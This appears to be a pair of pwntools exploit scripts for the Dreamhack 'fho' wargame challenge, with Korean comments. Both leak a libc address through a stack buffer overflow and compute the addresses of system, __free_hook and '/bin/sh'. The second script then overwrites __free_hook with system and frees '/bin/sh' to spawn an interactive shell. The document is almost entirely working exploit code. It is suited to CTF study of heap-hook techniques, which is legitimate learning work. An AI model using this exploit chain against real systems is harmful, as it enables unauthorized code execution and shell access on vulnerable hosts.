#!/usr/bin/env python3
#코드 두 개인데 디렉토리 빼기 귀찮아서 그냥 분리해서 넣었으니 참고하시길!!
#fho 문제에서 libc 주소 릭 → system("/bin/sh") 준비를 위해 __libc_start_main+231 오프셋을 이용해서 libc base를 계산하고, __free_hook, system, "/bin/sh" 주소를 가져오는 스니펫
from pwn import *

def slog(name, addr):
    return success(f"{name}: {hex(addr)}")

# ========== 가변값 ==========
REMOTE = False
HOST = "host3.dreamhack.games"
PORT = 12345
BIN_PATH = "./fho"
LIBC_PATH = "./libc-2.27.so"

OFFSET = 0x48  # buf offset → __libc_start_main 주소 릭까지 도달
RET_OFFSET = 231  # 오프셋 보정값: __libc_start_main + 231
# ===========================

def exploit():
    context.binary = BIN_PATH
    context.log_level = 'info'
    e = ELF(BIN_PATH)
    libc = ELF(LIBC_PATH)

    p = remote(HOST, PORT) if REMOTE else process(BIN_PATH)

    # Step 1: Leak libc address
    buf = b'A' * OFFSET
    p.sendafter('Buf: ', buf)
    p.recvuntil(buf)

    libc_start_main_ret = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = libc_start_main_ret - (libc.symbols['__libc_start_main'] + RET_OFFSET)

    system = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']
    binsh = libc_base + next(libc.search(b'/bin/sh'))

    slog('libc_start_main_ret', libc_start_main_ret)
    slog('libc_base', libc_base)
    slog('system', system)
    slog('free_hook', free_hook)
    slog('/bin/sh', binsh)

    # 이후 단계: write(free_hook, system) + free(binsh) 등을 조합할 수 있음
    p.interactive()

if __name__ == "__main__":
    exploit()


# __free_hook을 system으로 덮은 후 free("/bin/sh") 호출로 쉘을 따는 전형적인 방식
#!/usr/bin/env python3
from pwn import *

def slog(name, addr):
    return success(f"{name}: {hex(addr)}")

# ========== 가변값 ==========
REMOTE = False
HOST = "host3.dreamhack.games"
PORT = 12345
BIN_PATH = "./fho"
LIBC_PATH = "./libc-2.27.so"

BUF_OFFSET = 0x48  # read() overflow offset
RET_OFFSET = 231   # __libc_start_main+231 보정값
# ===========================

def exploit():
    context.binary = BIN_PATH
    context.log_level = 'info'
    e = ELF(BIN_PATH)
    libc = ELF(LIBC_PATH)

    p = remote(HOST, PORT) if REMOTE else process(BIN_PATH)

    # [1] Leak libc address
    payload = b"A" * BUF_OFFSET
    p.sendafter('Buf: ', payload)
    p.recvuntil(payload)

    libc_start_main_ret = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = libc_start_main_ret - (libc.symbols['__libc_start_main'] + RET_OFFSET)
    system = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']
    binsh = libc_base + next(libc.search(b'/bin/sh'))

    slog("libc_start_main_ret", libc_start_main_ret)
    slog("libc_base", libc_base)
    slog("system", system)
    slog("free_hook", free_hook)
    slog("/bin/sh", binsh)

    # [2] Overwrite __free_hook with system
    p.recvuntil("To write: ")
    p.sendline(str(free_hook))
    p.recvuntil("With: ")
    p.sendline(str(system))

    # [3] Trigger free("/bin/sh") to get shell
    p.recvuntil("To free: ")
    p.sendline(str(binsh))

    p.interactive()

if __name__ == "__main__":
    exploit()
